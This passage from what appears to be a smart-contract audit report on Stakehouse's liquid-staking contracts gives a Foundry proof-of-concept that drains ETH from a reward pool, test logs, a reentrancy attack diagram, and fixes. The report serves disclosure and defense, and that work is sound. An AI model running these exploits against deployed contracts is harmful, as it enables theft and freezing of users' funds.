600000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  accountTwo previewAccumulatedETH : 1200000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  accountTwo claimed               : 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ETH Balances: accountOne: 1200000000000000000, accountTwo: 0, vault: 1200000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  Claiming rewards for accountOne AGAIN.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  accountOne previewAccumulatedETH : 600000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  accountOne claimed               : 600000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  accountTwo previewAccumulatedETH : 1200000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  accountTwo claimed               : 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ETH Balances: accountOne: 1800000000000000000, accountTwo: 0, vault: 600000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  Claiming rewards for accountOne AGAIN.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  accountOne previewAccumulatedETH : 600000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  accountOne claimed               : 600000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  accountTwo previewAccumulatedETH : 1200000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  accountTwo claimed               : 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ETH Balances: accountOne: 2400000000000000000, accountTwo: 0, vault: 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Test result: FAILED. 0 passed; 1 failed; finished in 15.64ms</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Failing tests:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Encountered 1 failing test in test/foundry/StakingFundsVault.t.sol:StakingFundsVaultTest</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">[FAIL. Reason: Failed to transfer] testRepetitiveClaim() (gas: 3602403)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Encountered a total of 1 failing tests, 0 tests succeeded</span></span></code></pre>\n<h3 id=\"tools-used-6\" style=\"position:relative;\"><a href=\"#tools-used-6\" aria-label=\"tools used 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Manual review / forge test</p>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The <code>SyndicateRewardsProcessor</code> contract should be modified as follows:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/liquid-staking/SyndicateRewardsProcessor.sol b/contracts/liquid-staking/SyndicateRewardsProcessor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 81be706..9b9c502 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/liquid-staking/SyndicateRewardsProcessor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/liquid-staking/SyndicateRewardsProcessor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -60,7 +60,7 @@ abstract contract SyndicateRewardsProcessor {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // Calculate how much ETH rewards the address is owed / due </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             if (due &gt; 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                claimed[_user][_token] = due;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                claimed[_user][_token] += due;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 totalClaimed += due;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/147\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-10-giantmevandfeespoolbringunusedethbackintogiantpool-function-loses-the-addition-of-the-idleeth-which-allows-attackers-to-steal-most-of-eth-from-the-giant-pool\" style=\"position:relative;\"><a href=\"#h-10-giantmevandfeespoolbringunusedethbackintogiantpool-function-loses-the-addition-of-the-idleeth-which-allows-attackers-to-steal-most-of-eth-from-the-giant-pool\" aria-label=\"h 10 giantmevandfeespoolbringunusedethbackintogiantpool function loses the addition of the idleeth which allows attackers to steal most of eth from the giant pool permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/173\">[H-10] <code>GiantMevAndFeesPool.bringUnusedETHBackIntoGiantPool</code> function loses the addition of the idleETH which allows attackers to steal most of eth from the Giant Pool</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/173\">ronnyx2017</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/141\">Lambda</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126-L138\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126-L138</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L176-L178\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L176-L178</a><br></p>\n<p>The contract GiantMevAndFeesPool override the function totalRewardsReceived:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">return address(this).balance + totalClaimed - idleETH;</span></span></code></pre>\n<p>The function totalRewardsReceived is used as the current rewards balance to caculate the unprocessed rewards in the function <code>SyndicateRewardsProcessor._updateAccumulatedETHPerLP</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">uint256 received = totalRewardsReceived();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">uint256 unprocessed = received - totalETHSeen;</span></span></code></pre>\n<p>The idleETH will be decreased in the function <code>batchDepositETHForStaking</code> for sending eth to the staking pool. But the idleETH wont be increased in the function <code>bringUnusedETHBackIntoGiantPool</code> which is used to burn lp tokens in the staking pool, and the staking pool will send the eth back to the giant pool. And then because of the diminution of the idleETH, the <code>accumulatedETHPerLPShare</code> is added out of thin air. So the attacker can steal more eth from the GiantMevAndFeesPool.</p>\n<h3 id=\"proof-of-concept-8\" style=\"position:relative;\"><a href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>test:<br>\ntest/foundry/TakeFromGiantPools.t.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">pragma solidity ^0.8.13;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// SPDX-License-Identifier: MIT</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import &quot;forge-std/console.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {GiantPoolTests} from &quot;./GiantPools.t.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { LPToken } from &quot;../../contracts/liquid-staking/LPToken.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract TakeFromGiantPools is GiantPoolTests {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function testDWclaimRewards() public{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address feesAndMevUserOne = accountTwo; vm.deal(feesAndMevUserOne, 4 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address feesAndMevUserTwo = accountThree; vm.deal(feesAndMevUserTwo, 4 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Register BLS key</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Deposit ETH into giant fees and mev</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(feesAndMevUserOne);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(feesAndMevUserTwo);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes[][] memory blsKeysForVaults = new bytes[][](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256[][] memory stakeAmountsForVaults = new uint256[][](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        stakeAmountsForVaults[0] = getUint256ArrayFromValues(4 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        giantFeesAndMevPool.batchDepositETHForStaking(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            getAddressArrayFromValues(address(manager.stakingFundsVault())),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            getUint256ArrayFromValues(4 ether),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            blsKeysForVaults,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            stakeAmountsForVaults</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.warp(block.timestamp+31 minutes);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        LPToken[] memory tokens = new LPToken[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        tokens[0] = manager.stakingFundsVault().lpTokenForKnot(blsPubKeyOne);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        LPToken[][] memory allTokens = new LPToken[][](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        allTokens[0] = tokens;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        giantFeesAndMevPool.bringUnusedETHBackIntoGiantPool(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            getAddressArrayFromValues(address(manager.stakingFundsVault())),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            allTokens,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            stakeAmountsForVaults</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // inject a NOOP to skip some functions</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address[] memory stakingFundsVaults = new address[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes memory code = new bytes(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        code[0] = 0x00;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.etch(address(0x123), code);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        stakingFundsVaults[0] = address(0x123);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        giantFeesAndMevPool.claimRewards(feesAndMevUserTwo, stakingFundsVaults, blsKeysForVaults);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;user one:&quot;, getBalance(feesAndMevUserOne));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;user two(attacker):&quot;, getBalance(feesAndMevUserTwo));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;giantFeesAndMevPool:&quot;, getBalance(address(giantFeesAndMevPool)));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function getBalance(address addr) internal returns (uint){</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // giant LP : eth at ratio of 1:1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return addr.balance + giantFeesAndMevPool.lpTokenETH().balanceOf(addr);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>run test:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">forge test --match-test testDWclaimRewards -vvv</span></span></code></pre>\n<p>test log:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Logs:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  user one: 4000000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  user two(attacker): 6000000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  giantFeesAndMevPool: 6000000000000000000</span></span></code></pre>\n<p>The attacker stole 2 eth from the pool.</p>\n<h3 id=\"tools-used-7\" style=\"position:relative;\"><a href=\"#tools-used-7\" aria-label=\"tools used 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>foundry</p>\n<h3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">idleETH += _amounts[i];</span></span></code></pre>\n<p>before burnLPTokensForETH in the GiantMevAndFeesPool.bringUnusedETHBackIntoGiantPool function.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/173\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-11-protocol-insolvent---permanent-freeze-of-funds\" style=\"position:relative;\"><a href=\"#h-11-protocol-insolvent---permanent-freeze-of-funds\" aria-label=\"h 11 protocol insolvent   permanent freeze of funds permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/176\">[H-11] Protocol insolvent - Permanent freeze of funds</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/176\">0xdeadbeef0x</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/436\">joestakey</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L934\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L934</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L524\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L524</a><br></p>\n<ul>\n<li>Permanent freeze of funds - users who deposited ETH for staking will not be able to receive their funds, rewards or rotate to another token. The protocol becomes insolvent, it cannot pay anything to the users.</li>\n<li>Protocol’s LifecycleStatus state machine is broken</li>\n</ul>\n<p>Other impacts:</p>\n<ul>\n<li>Users deposit funds to an unstakable validator (node runner has already took out his funds)</li>\n</ul>\n<p>Impact is also on the Giant Pools that give liquidity to the vaults.</p>\n<p>A competitor or malicious actor can cause bad PR for the protocol by causing permanent freeze of user funds at LSD stakehouse.</p>\n<h3 id=\"proof-of-concept-9\" style=\"position:relative;\"><a href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>There are two main bugs that cause the above impact:</p>\n<ol>\n<li>Reentrancy bug in <code>withdrawETHForKnot</code> function in <code>LiquidStakingManager.sol</code></li>\n<li>Improper balance check in <code>LiquidStakingManager.sol</code> for deposited node runner funds.</li>\n</ol>\n<p>For easier reading and understanding, please follow the below full attack flow diagram when reading through the explanation.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">┌───────────┐               ┌───────────┐            ┌───────────┐              ┌───────────┐</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">│           │               │           │            │           │              │           │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">│Node Runner│               │LSD Manager│            │   Vaults  │              │   Users   │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">│           │               │           │            │           │              │           │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">└─────┬─────┘               └─────┬─────┘            └─────┬─────┘              └─────┬─────┘</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                           │                        │                          │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │   Register BLS Key #1     │                        │                          │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      ├──────────────────────────►│                        │                          │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                           │                        │                          │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │   Register BLS Key #1     │                        │                          │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      ├──────────────────────────►│                        │Deposit 24 ETH to savETH  │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                           │                        │◄─────────────────────────┤</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                           │                        │                          │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                           │                        │Deposit 4 ETH to mevAndFees</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                           │                        │◄─────────────────────────┐</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │WithdrawETHForKnot BLS #1  │                        │                          │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      ├──────────────────────────►│                        │                          │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │       Send 4 ETH          │                        │                          │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │◄──────────────────────────┤                        │                          │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │ Reenter stake function    │                        │                          │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      ├──────────────────────────►│Get 28 ETH from vaults  │                          │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                           ├───────────────────────►│                          │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │ ┌───────────────────────┐ │     Send 28 ETH        │                          │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │ │ Stake complete.       │ │◄───────────────────────┤                          │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │ │status=DEPOSIT_COMPLETE│ │                        │                          │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │ └───────────────────────┘ │                        │                          │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │Finished WithdrawETHForKnot│                        │                          │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │◄──────────────────────────┤                        │Users cannot mint derivati│es</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                           │                        │◄─────────────────────────┤</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │    ┌──────────────────┐   │                        │Users cannot burnLPTokens │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │    │BLS Key #1 banned │   │                        │◄─────────────────────────┤</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │  